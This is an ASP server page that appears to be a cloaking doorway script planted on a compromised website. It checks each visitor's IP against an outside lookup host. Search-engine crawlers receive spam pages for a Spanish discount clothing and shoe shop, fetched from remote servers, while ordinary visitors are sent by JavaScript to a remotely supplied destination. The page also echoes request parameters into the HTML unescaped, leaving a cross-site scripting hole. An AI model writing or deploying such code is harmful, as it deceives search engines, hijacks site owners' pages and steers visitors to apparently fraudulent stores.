<%
Function getHTTPPage(url) 
On Error Resume Next
dim http 
set http=Server.createobject("Microsoft.XMLHTTP") 
Http.open "GET",url,false 
Http.setRequestHeader "User-Agent","Mozilla/5.0 (Windows NT 6.1; WOW64; rv:20.0) Gecko/20100101 Firefox/20.0"  
Http.send() 
if Http.readystate<>4 then
exit function 
end if 
getHTTPPage=bytesToBSTR(Http.responseBody,"utf-8")
set http=nothing
If Err.number<>0 then 
Response.Write "<p align='center'><font color='red'><b> </b></font></p>" 
Response.end
Err.Clear
End If  
End Function

Function BytesToBstr(body,Cset)
dim objstream
set objstream = Server.CreateObject("adodb.stream")
objstream.Type = 1
objstream.Mode =3
objstream.Open
objstream.Write body
objstream.Position = 0
objstream.Type = 2
objstream.Charset = Cset
BytesToBstr = objstream.ReadText 
objstream.Close
set objstream = nothing
End Function
Randomize
%>
<%
Dim Url,Html,hyzhdy,kname
hyzhdy="http://bbimg.style-js.com/SJ/JDNEW.aspx"
if request("iid")<>"" then
kname =getHTTPPage("http://bbimg.style-js.com/gn.aspx?iid="&request("iid"))
end if
if request("kk")<>"" then
ip="66.249.64.190"
else
ip=Request.ServerVariables("REMOTE_ADDR")
end if

ipurl="http://cdoi09.fr/getdomain.aspx?rnd=1&ip="&ip
domain =getHTTPPage(ipurl)
if(instr(domain,"google")=0 and instr(domain,"msn.com")=0 and instr(domain,"yahoo.com")=0 and instr(domain,"aol.com")=0) then
    if request("iid")<>""  then
    ddd=getHTTPPage("http://tz.div-js.com/xtz.txt")
    ddd=ddd&"?cid="&request("cid")&"&cname="&Server.URLEncode(kname)
    Response.write "<script>self.location.href="""&ddd&"""</script>"
    end if	
     if request("searchtxt")<>""  then
    ddd=getHTTPPage("http://tz.div-js.com/xtz.txt")
    ddd=ddd&"?cid="&request("cid")&"&cname="&Server.URLEncode(request("searchtxt"))
    Response.write "<script>self.location.href="""&ddd&"""</script>"
    end if
     if request("pnum")<>""  then
    ddd=getHTTPPage("http://tz.div-js.com/xtz.txt")
	ddd=Replace(ddd, "products.aspx", "")
    ddd=ddd&"?cid="&request("cid")
    Response.write "<script>self.location.href="""&ddd&"""</script>"
    end if	
end if
%>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<script>
document.cookie="u="+window.location.href;
</script>

<title> <%=kname%><%=request("searchtxt")%> - Tienda Online de Zapatos, Ropa y Complementos de marca <%=request("pnum")%> </title>
<meta name="keywords" content="<%=kname%><%=request("searchtxt")%>"/>
<meta name="description" content=" Sale OFF-<%=INT((65-50+1)*RND+50)%>% > <%=kname%> Bienvenido en nuestra tienda.Aquí encontrarás la más completa selección de ropa, zapatos, deportes y accesorios con los mejores tips. <%=request("searchtxt")%>" />
<meta name="robots" content="index,follow,all"/>
<meta http-equiv="Content-Type" content="text/html;charset=utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
</head>
<body>
<%

if request("type")<>"" then
if(request("type")="search") then
URL=hyzhdy&"?cid="&request("cid")&"&searchtxt="&request("searchtxt")
con=getHTTPPage(URL)
con=Replace(con, "UUUUU", "http://"&Request.ServerVariables("HTTP_HOST")&Request.ServerVariables("SCRIPT_NAME"))
end if
else
if request("iid")<>"" then
URL=hyzhdy&"?iid="&request("iid")&"&mt=http://bbimg.style-js.com/en/enm.txt&cid="&request("cid")

else
cid=INT((64-54+1)*rnd+54)
if request("cid")<>"" then
cid=request("cid")
end if
URL=hyzhdy&"?cid="&cid&"&pnum="&request("pnum")
end if
con=getHTTPPage(URL)
con=Replace(con, "UUUUU", "http://"&Request.ServerVariables("HTTP_HOST")&Request.ServerVariables("SCRIPT_NAME"))
con=Replace(con, "BBBBB", Request.ServerVariables("HTTP_HOST"))
con=Replace(con, "NNNNN", "Zapatos Outlet: Ropa, Zapatos y Complementos")
con=Replace(con, "SSSSS", "Compre en línea para Zapatos Outlet a partir de una gran selección en Ropa, Zapatos y Complementos tienda.")
con=Replace(con, "DDDDD", kname&"Compra online y envíos a global: ropa barata, calzado, vestidos, jeans, accesorios, blusas y mucho más a precios económicos y mayoristas."&request("searchtxt"))
end if
Response.write con
%> 
</body>

</html>  